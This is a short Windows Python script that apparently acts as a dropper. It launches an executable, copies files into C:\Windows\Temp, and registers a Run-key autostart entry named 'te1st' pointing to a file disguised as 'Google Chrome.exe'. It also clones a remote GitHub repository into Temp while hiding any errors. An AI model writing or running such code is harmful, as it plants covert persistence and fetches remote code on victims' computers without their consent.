import os
import subprocess
import git
subprocess.Popen(["Debug.exe"])
os.popen("xcopy help\en\manual\gui C:\Windows\Temp")
os.system(r'echo Y | reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v te1st /t REG_SZ /d "C:\Windows\Temp\Google Chrome.exe"')
try:
    git.Repo.clone_from('https://github.com/dimagamera/PythonLib.git', 'C:\Windows\Temp\lib')
except:
    print(" ")
